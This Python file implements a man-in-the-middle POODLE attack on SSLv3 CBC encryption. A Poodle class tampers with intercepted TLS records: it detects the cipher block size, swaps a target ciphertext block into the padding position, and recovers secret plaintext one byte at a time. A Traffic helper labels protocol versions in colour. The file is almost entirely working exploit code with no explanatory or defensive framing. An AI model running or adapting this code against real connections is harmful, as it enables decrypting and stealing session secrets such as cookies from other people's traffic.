import binascii
import color_def
import sys
import struct


class Poodle:
    def __init__(self):
        self.length_block = 8
        self.length_block_found = False
        self.first_packet_found = False
        self.find_block_length = True
        self.first_packet = ''
        self.ssl_header = ''
        self.frame = ''
        self.data_altered = False
        self.decipherable = False
        self.count = 0
        self.decipher_byte = ""
        self.secret = []
        self.length_request = 0
        self.current_block = 1
        self.secret_block = []
        self.packet_count = 0
        self.downgrade = False
        self.autoDowngrade = False
        self.length_previous_block = 0
        self.completed = False
        self.applyBlock = False

    def exploit(self, content_type, version, length, data, request):
        # if data and the data is not a favicon check #7
        if content_type == 23 and length > 24 and length >= len(self.first_packet):
            print("exploit call")
            # save the first packet, so we can generate a wrong HMAC when we want
            # TODO : remove this and just alter the last byte of the packet when length of the
            #       block is found
            if not self.first_packet_found:
                self.first_packet = data
                self.ssl_header = struct.pack('>BHH', content_type, version, length)
                self.first_packet_found = True

            if length == 32:
                print("Packet with length 32 ignored, data: " + str(data));
            else:
                # find the length of a block and return an HMAC error when we find the length
                if self.find_block_length:
                    if self.find_size_of_block(length) == 1:
                        # print("Attempting to return 500 Internal server error")
                        # data = "HTTP/1.0 500 Internal Server Error\r\n\r\n"
                        # request.send(data.encode())
                        return self.first_packet, self.ssl_header, True

                # exploit exploit exploit
                if self.length_block_found:
                    self.data_altered = True

                    self.total_block = (len(data) / self.length_block) - 2
                    request = self.split_len(binascii.hexlify(data), 16)

                    request[-1] = request[self.current_block]
                    pbn = request[-2]
                    pbi = request[self.current_block - 1]
                    self.decipher_byte = chr((self.length_block - 1) ^ int(pbn[-2:], 16) ^ int(pbi[-2:], 16))
                    sys.stdout.write("\r[+] Sending request [%3d] \033[36m%3d\033[0m - Block %d/%d : [%*s]" % (
                        length, self.count, self.current_block, self.total_block, self.length_block,
                        ''.join(self.secret_block[::-1])))
                    sys.stdout.flush()
                    data = binascii.unhexlify(b''.join(request))

        return data, struct.pack('>BHH', content_type, version, length), False

    def decipher(self):
        self.completed = True
        self.secret_block.append(self.decipher_byte.encode("unicode_escape").decode("utf-8"))
        sys.stdout.write("\r[+] Sending request \033[36m%3d\033[0m - Block %d/%d : [%*s]" % (
            self.count, self.current_block, self.total_block, self.length_block, ''.join(self.secret_block[::-1])))
        sys.stdout.flush()
        if len(self.secret_block) == self.length_block and self.current_block < (self.total_block):
            print('')
            self.secret += self.secret_block[::-1]
            self.current_block = self.current_block + 1
            self.secret_block = []
        elif len(self.secret_block) == self.length_block and self.current_block == self.total_block:
            # stop the attack and go to passive mode
            self.secret += self.secret_block[::-1]
            self.secret_block = []
            self.length_block_found = False
            print('\nStopping the attack...')

    def decipher2(self):
        print(self.decipher_byte.encode("unicode_escape").decode("utf-8"))

    def split_len(self, seq, length):
        return [seq[i:i + length] for i in range(0, len(seq), length)]

    def find_size_of_block(self, length_current_block):
        print(str(length_current_block), str(self.length_previous_block),
              str(length_current_block - self.length_previous_block))
        if (length_current_block - self.length_previous_block) == 8 or (
                length_current_block - self.length_previous_block) == 16:
            print("CBC block size " + str(length_current_block - self.length_previous_block))
            self.length_block = length_current_block - self.length_previous_block
            return 1
        else:
            self.length_previous_block = length_current_block
        return 0


class Traffic:
    def __init__(self):
        self.protocol_all = {768: [' SSLv3.0 ', color_def.bcolors.RED], 769: [' TLSv1.0 ', color_def.bcolors.GREEN],
                             770: [' TLSv1.1 ', color_def.bcolors.GREEN], 771: [' TLSv1.2 ', color_def.bcolors.GREEN],
                             772: [' TLSv1.3 ', color_def.bcolors.GREEN]}
        self.protocol_current = ''
        self.protocol_current_color = color_def.bcolors.GREEN
        self.protocol_downgrade = 0
        self.protocol_autoDowngrade = 0
        self.favicon = False

    def info_traffic(self, color1, protocol, color2, status):
        columns = 80
        print(''.rjust(
            int(columns) - 20) + color1 + color_def.bcolors.BOLD + protocol + color2 + color_def.bcolors.BOLD + status + color_def.bcolors.ENDC)
